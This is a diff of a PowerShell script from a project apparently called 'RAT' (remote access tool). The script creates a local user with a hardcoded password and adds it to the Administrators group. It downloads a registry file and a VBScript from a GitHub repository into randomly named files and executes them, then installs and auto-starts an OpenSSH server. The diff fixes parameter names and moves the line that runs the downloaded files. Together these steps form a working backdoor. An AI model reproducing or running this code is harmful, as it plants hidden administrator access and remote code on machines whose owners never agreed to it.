@@ -12,13 +12,13 @@ function create_account {
     [CmdletBinding()]
     param(
         [string] $NewName,
-        [securestring] $Serr
+        [securestring] $Password
     )
     begin{
 
     }
     process{
-        New-LocalUser "$NewName" -Serr $Serr -FullName "$NewName" -Description "Temporary local admin"
+        New-LocalUser "$NewName" -Password $Password -FullName "$NewName" -Description "Temporary local admin"
         Write-Verbose "$NewName local user created"
         Add-LocalGroupMember -Group "Administrators" -Member "$NewName"
     }
@@ -43,19 +43,15 @@ Set-Location $path
 # Now you can proceed with your script
 Write-Output "" > poc.txt
 
-$NewName = "yesss"
-$Serr = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
-create_account -NewName $NewName -Serr $Serr
+$NewName = "jarbou3"
+$Password = (ConvertTo-SecureString "jarbou3" -AsPlainText -Force)
+Create-Account -NewName $NewName -Password $Password
 
 $reg_file = random_text
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/admin.reg -OutFile "$reg_file.vbs"
+Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/admin.reg -OutFile "$reg_file.reg"
 
 $vbs_file = random_text
 Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/files/confirm.vbs -OutFile "$vbs_file.vbs"
-
-./"$reg_file.reg";"$vbs_file.vbs"
-
-
 
 
 
@@ -63,7 +59,9 @@ Invoke-WebRequest -Uri https://raw.githubusercontent.com/riahifiras/RAT/main/fil
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
 Start-Service sshd
 Set-Service -Name sshd -StartupType 'Automatic'
-Get-NetFirewallRule -Name *ssh*
+
+
+./"$reg_file.reg";"$vbs_file.vbs"
 
 
 Set-Location C:\Users\user\OneDrive\Bureau\rat\files
